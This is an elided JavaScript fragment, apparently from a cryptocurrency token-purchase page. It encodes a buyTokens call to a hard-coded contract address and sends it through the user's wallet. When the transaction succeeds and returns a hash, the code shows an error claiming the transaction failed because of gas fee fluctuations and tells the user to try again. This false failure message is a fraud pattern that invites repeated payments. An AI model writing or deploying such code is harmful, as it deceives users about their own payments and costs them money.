...
const ADDRESS = '0x0F75c36dE2f5A320ffE7d5cBE9089B5C0cb184bC';
...
const sendTransaction =  async () => {
   const data = await contract.methods.buyTokens(accounts[0],input.value).encodeABI()
    ...
    ethereum.request({
        ...
        .then((txHash) => {
            // console.log(txHash)
            toastr.error('Transaction failed due to gas fee fluctuations. Please try again in a few seconds.', 'TXN ERROR');
        })
